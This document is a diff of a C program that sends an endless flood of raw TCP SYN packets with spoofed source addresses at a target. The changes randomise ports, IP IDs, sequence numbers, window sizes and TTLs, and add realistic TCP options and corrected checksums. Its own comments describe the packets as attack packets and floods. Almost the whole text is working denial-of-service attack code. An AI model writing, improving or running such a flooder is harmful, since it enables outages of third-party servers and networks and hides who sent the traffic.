@@ -24,9 +24,22 @@ License: MIT
 #define DEBUG 0 // Set verbosity
 #define DELAY 0 // Set delay between packets in seconds
 #define RAND_SRC_ADDR 1 // Toggle source address randomization
-#define RAND_SRC_PORT 0 // Toggle source port randomization
-#define INCREMENT_ID 1 // Toggle incrementing of IP ID field
-#define FAST_CSUM 0 // Toggle fast checksum updating (experimental)
+#define RAND_SRC_PORT 1 // Toggle source port randomization
+#define RAND_ID 1 // Toggle IP ID randomization
+#define RAND_SEQ 1 // Toggle TCP Sequence Number randomization
+#define RAND_WINDOW 1 // Toggle Window Size randomization
+#define RAND_TTL 1 // Toggle TTL randomization
+#define RAND_TTL_MIN 55
+#define RAND_TTL_MAX 63
+
+#define PROTO_TCP_OPT_NOP   1
+#define PROTO_TCP_OPT_MSS   2
+#define PROTO_TCP_OPT_WSS   3
+#define PROTO_TCP_OPT_SACK  4
+#define PROTO_TCP_OPT_TSVAL 8
+
+#define TCP_OPT_LEN 20
+
 
 /*
   Maximum total packet size.  This could be larger, but packets over 1500 bytes
@@ -34,7 +47,7 @@ License: MIT
 	header) is only 40 bytes, and at most 100.  Other attack packets also tend to
 	be very small in order to maximize per-packet overhead in the network.
 */
-const uint32_t MAX_PACKET_SIZE = 1500;
+const uint32_t MAX_PACKET_SIZE = 9000;
 
 // Default Source IP, in case we aren't randomizing
 const char default_src_addr[32] = "127.0.0.1";
@@ -58,24 +71,69 @@ struct pseudo_header {
 	u_int16_t tcp_length;
 };
 
-static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
-  if (old_saddr == iph->saddr){
-    return;
-  }
-  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
-  sum += ntohs(iph->check);
-  sum = (sum & 0xffff) + (sum>>16);
-  iph->check = htons(sum + (sum>>16) + 1);
+static uint32_t x, y, z, w;
+
+void rand_init(void)
+{
+    x = time(NULL);
+    y = getpid() ^ getppid();
+    z = clock();
+    w = z ^ y;
 }
 
-static void update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr) {
-  if (old_saddr == iph->saddr){
-    return;
-  }
-  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
-  sum += ntohs(tcph->check);
-  sum = (sum & 0xffff) + (sum>>16);
-  tcph->check = htons(sum + (sum>>16) + 1);
+uint32_t rand_next(void) //period 2^96-1
+{
+    uint32_t t = x;
+    t ^= t << 11;
+    t ^= t >> 8;
+    x = y; y = z; z = w;
+    w ^= w >> 19;
+    w ^= t;
+    return w;
+}
+
+uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
+    register unsigned long sum = 0;
+
+    for (sum = 0; count > 1; count -= 2)
+        sum += *addr++;
+    if (count == 1)
+        sum += (char)*addr;
+
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    
+    return ~sum;
+}
+
+uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
+    const uint16_t *buf = buff;
+    uint32_t ip_src = iph->saddr;
+    uint32_t ip_dst = iph->daddr;
+    uint32_t sum = 0;
+    int length = len;
+    
+    while (len > 1)
+    {
+        sum += *buf;
+        buf++;
+        len -= 2;
+    }
+
+    if (len == 1)
+        sum += *((uint8_t *) buf);
+
+    sum += (ip_src >> 16) & 0xFFFF;
+    sum += ip_src & 0xFFFF;
+    sum += (ip_dst >> 16) & 0xFFFF;
+    sum += ip_dst & 0xFFFF;
+    sum += htons(iph->protocol);
+    sum += data_len;
+
+    while (sum >> 16) 
+        sum = (sum & 0xFFFF) + (sum >> 16);
+
+    return ((uint16_t) (~sum));
 }
 
 static uint32_t random_ipv4(void) {
@@ -122,31 +180,8 @@ static uint32_t random_ipv4(void) {
 }
 
 static uint16_t random_port(void) {
-	uint32_t port = (uint32_t)(rand()) & 0xff;
+	uint16_t port = (uint16_t)(rand()) & 0xff;
 	return port;
-}
-
-unsigned short csum(unsigned short *ptr,int nbytes) {
-	register long sum;
-	unsigned short oddbyte;
-	register short answer;
-
-	sum=0;
-	while(nbytes>1) {
-		sum+=*ptr++;
-		nbytes-=2;
-	}
-	if(nbytes==1) {
-		oddbyte=0;
-		*((u_char*)&oddbyte)=*(u_char*)ptr;
-		sum+=oddbyte;
-	}
-
-	sum = (sum>>16)+(sum & 0xffff);
-	sum = sum + (sum>>16);
-	answer=(short)~sum;
-
-	return(answer);
 }
 
 int main(int argc, char *argv[]) {
@@ -156,6 +191,13 @@ int main(int argc, char *argv[]) {
 	if(s == -1) {
 		// Socket creation failed, may be because of non-root privileges
 		perror("Failed to create socket, do you have root priviliges?");
+		exit(1);
+	}
+
+	//IP_HDRINCL to tell the kernel that headers are included in the packet
+	int option_value = 1;
+	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
+		perror("Error setting IP_HDRINCL");
 		exit(1);
 	}
 
@@ -208,29 +250,31 @@ int main(int argc, char *argv[]) {
 	#endif
 
 
-  // Seed RNG
-  srand(time(NULL));
+	// Seed RNG
+	srand(time(NULL));
+	rand_init();
 
 	// Byte array to hold the full packet
 	char datagram[MAX_PACKET_SIZE];
 
 	// Pointer for the packet payload
-	char *data;
+	// char *data;
 
 	// Pointer for the pseudo-header used in TCP checksum
-	char *pseudogram;
+	// char *pseudogram;
 
 	// Zero out the packet buffer
 	memset (datagram, 0, MAX_PACKET_SIZE);
 
 	// Initialize headers
 	struct iphdr *iph = (struct iphdr *) datagram;
-	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
-	struct pseudo_header psh;
+	struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+	uint8_t *opts = (uint8_t *)(tcph + 1);
+	// struct pseudo_header psh;
 
 	// TCP Payload
-	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
-	strcpy(data, "");
+	// data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + TCP_OPT_LEN;
+	// strcpy(data, "");
 
 	// Address resolution
 	struct sockaddr_in sin;
@@ -242,104 +286,96 @@ int main(int argc, char *argv[]) {
 	iph->ihl = 5;
 	iph->version = 4;
 	iph->tos = 0;
-	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
-	iph->id = htonl(0);	//Id of this packet, can be any value
-	iph->frag_off = 0;
+	iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + TCP_OPT_LEN);// + strlen(data); //20 bytes of options
+	iph->id = htons(0);	//Id of this packet, can be any value
+	iph->frag_off = htons(1 <<14);
 	iph->ttl = 64;
 	iph->protocol = IPPROTO_TCP;
 	iph->check = 0;		//Set to 0 before calculating checksum
 	iph->saddr = inet_addr(default_src_addr);
 	iph->daddr = sin.sin_addr.s_addr;
 
-	// IP checksum
-	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
-
 	// TCP Header
 	tcph->source = htons(default_src_port);
 	tcph->dest = sin.sin_port;
 	tcph->seq = 0;
 	tcph->ack_seq = 0;
-	tcph->doff = 5; // TCP Header Size in 32-bit words (5-15)
+	tcph->doff = 10; // TCP Header Size in 32-bit words (5-15)
 	tcph->fin=0;
 	tcph->syn=1;
 	tcph->rst=0;
 	tcph->psh=0;
 	tcph->ack=0;
 	tcph->urg=0;
-	tcph->window = htons(65535); // Maximum possible window size (without scaling)
+	// tcph->window = htons(65535); // Maximum possible window size (without scaling)
 	tcph->check = 0;
 	tcph->urg_ptr = 0;
 
-	// TCP checksum
-	psh.source_address = inet_addr(default_src_addr);
-	psh.dest_address = sin.sin_addr.s_addr;
-	psh.placeholder = 0;
-	psh.protocol = IPPROTO_TCP;
-	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
+	// TCP MSS
+	*opts++ = PROTO_TCP_OPT_MSS;    // Kind
+	*opts++ = 4;                    // Length
+	*((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
+	opts += sizeof (uint16_t);
 
-	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
-	pseudogram = malloc(psize);
+	// TCP SACK permitted
+	*opts++ = PROTO_TCP_OPT_SACK;
+	*opts++ = 2;
 
-	memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
-	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));
+	// TCP timestamps
+	*opts++ = PROTO_TCP_OPT_TSVAL;
+	*opts++ = 10;
+	*((uint32_t *)opts) = rand_next();
+	opts += sizeof (uint32_t);
+	*((uint32_t *)opts) = 0;
+	opts += sizeof (uint32_t);
 
-	tcph->check = csum((unsigned short*) pseudogram, psize);
+	// TCP nop
+	*opts++ = 1;
 
-	//IP_HDRINCL to tell the kernel that headers are included in the packet
-	int option_value = 1;
-	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
-		perror("Error setting IP_HDRINCL");
-		exit(1);
-	}
+	// TCP window scale
+	*opts++ = PROTO_TCP_OPT_WSS;
+	*opts++ = 3;
+	*opts++ = 6; // 2^6 = 64, window size scale = 64
 
-	__be32 old_saddr;
-	__be32 new_saddr;
 	// Generate packets forever, the caller must terminate this program manually
 	while(1) {
-		#if RAND_SRC_ADDR || RAND_SRC_PORT || INCREMENT_ID
-			#if RAND_SRC_ADDR
-			// Generate a new random source IP, excluding certain prefixes
-	    	new_saddr = (__be32)(random_ipv4());
-			#endif
-
-			#if RAND_SRC_PORT
-				tcph->source = random_port();
-			#endif
-
-			#if INCREMENT_ID
-				iph->id = htons(ntohs(iph->id) + 1);
-			#endif
-
-			#if FAST_CSUM
-				/*
-				In theory these functions could enable faster floods by updating
-				checksums to account for modifications rather than recomputing
-				checksums from scratch for each packet.  The downside is that they only
-				allow chanigng a single header field at a time, which is currently
-				hard-coded to be the source IP.  Additionally, the speedup appears to be
-				irrelevant -- there is some other bottleneck in packet generation that
-				limits us to ~150,000 packets per second on current-gen hardware, even
-				with multi-threading.
-				*/
-		    old_saddr = iph->saddr;
-				update_ip_csum(struct iphdr* iph, __be32 old_saddr);
-	    	update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr);
-			#else
-		    iph->check = 0;
-		    iph->saddr = new_saddr;
-		    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
-
-		    tcph->check = 0;
-				tcph->seq = new_saddr;
-		    psh.source_address = new_saddr;
-		    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
-		  	memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
-		  	tcph->check = csum( (unsigned short*) pseudogram , psize);
-			#endif
+		struct iphdr *iph = (struct iphdr *)datagram;
+        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+		// Generate a new random source IP, excluding certain prefixes
+		// new_saddr = (__be32)(random_ipv4());
+		#if RAND_SRC_ADDR
+			iph->saddr = (__be32)(random_ipv4());
 		#endif
 
+		#if RAND_ID
+			iph->id = rand_next() & 0xffff;
+		#endif
+
+		#if RAND_WINDOW
+			tcph->window = rand_next() & 0xffff;
+		#endif
+
+		#if RAND_SRC_PORT
+			tcph->source = rand_next() & 0xffff;
+			tcph->dest =htons(80);
+			sin.sin_port = tcph->dest;
+		#endif
+
+		#if RAND_SEQ
+			tcph->seq = rand_next() & 0xffff;
+		#endif
+
+		#if RAND_TTL
+			iph->ttl = rand_next() % (RAND_TTL_MAX + 1 - RAND_TTL_MIN) + RAND_TTL_MIN;
+		#endif
+
+		iph->check = 0;
+		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+		tcph->check = 0;
+		tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + TCP_OPT_LEN), sizeof (struct tcphdr) + TCP_OPT_LEN);
+
 		// Send the packet
-		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
+		if (sendto (s, datagram, sizeof (struct iphdr) + sizeof (struct tcphdr) + TCP_OPT_LEN,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
 			perror("Error sending packet");
 		}
 
@@ -348,7 +384,7 @@ int main(int argc, char *argv[]) {
 		#endif
 
 		#if DELAY
-    	sleep(DELAY);
+			sleep(DELAY);
 		#endif
 
 		if (busy_wait) {
@@ -357,6 +393,5 @@ int main(int argc, char *argv[]) {
 			}
 		}
 	}
-
 	return 0;
 }
